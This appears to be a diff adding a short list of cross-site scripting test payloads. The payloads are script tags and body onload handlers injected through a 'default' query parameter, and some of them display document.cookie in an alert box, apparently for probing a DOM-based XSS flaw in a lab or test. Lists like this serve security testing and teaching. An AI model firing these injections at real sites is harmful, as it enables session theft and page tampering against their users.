@@ -1,0 +1,6 @@
+<script>alert("test")</script>
+<script>alert(document.cookie)</script>
+?default=</select><body onload="alert('Hacked')">
+</select><body onload="alert(document.cookie)">
+?default=English&<script>alert("Hacked")</script>
+?default=English&<script>alert(document.cookie)</script>
